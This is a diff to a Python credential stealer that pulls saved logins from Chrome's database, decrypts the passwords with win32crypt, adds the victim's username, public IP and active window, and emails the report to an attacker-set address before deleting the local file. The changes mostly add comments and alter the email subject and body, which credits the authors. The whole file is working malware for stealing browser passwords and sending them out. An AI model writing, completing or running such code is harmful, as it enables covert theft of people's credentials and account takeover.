@@ -35,29 +35,32 @@ def get_bytes():
   c = sqlite3.connect(data_path)
   cursor = c.cursor()
   select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
-  cursor.execute(select_statement)
- 
+  # checks to see if database is locked	
+  cursor.execute(select_statement) # if you're given "database is locked" (which you wont, because # kill chrome does that for you automatically.
+  # fetches all chrome tables from database
   login_data = cursor.fetchall()
- 
+
+  #credential dictionary		
   cred = {}
  
   string = ''
- 
+	
+  # displays current window opened as they ran the script
   string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'
- 
+  # writes user data to .txt file
   string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n'
  
- 
+  # writing passwords to a .txt file
   for url, user_name, pwd in login_data:
       pwd = win32crypt.CryptUnprotectData(pwd)
       cred[url] = (user_name, pwd[1].decode('utf8'))
       string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
       with open('report.txt', 'w') as fp:
         fp.write(string)
-
+# sends .txt as an attachment, to your email
 def send_stuff():
     # our email contents
-    mail_content = 'Haha you got hacked lol'
+    mail_content = 'INSTRUCTIONS:\n• Attachment name is noname, please rename it with .txt at the end of it.\n• This was sent by parad0x and Snavellet.\n'
 
     #email 
     sender_address = 'SENDER ADDRESS'
@@ -68,7 +71,7 @@ def send_stuff():
     message = MIMEMultipart()
     message['From'] = sender_address
     message['To'] = receiver_address
-    message['Subject'] = 'HACKED'
+    message['Subject'] = 'chromehacking'
     message.attach(MIMEText(mail_content, 'plain'))
     attach_file_name = 'report.txt'
     attach_file = open('report.txt', 'r') # opens the file in read mode
@@ -87,9 +90,9 @@ def send_stuff():
     session.sendmail(sender_address, receiver_address, text)
     session.quit()
 
-
+# runs every event
 if __name__ == '__main__':
 	get_bytes()
 	send_stuff()
-
+# removes .txt file from victims computer
 os.remove('report.txt')
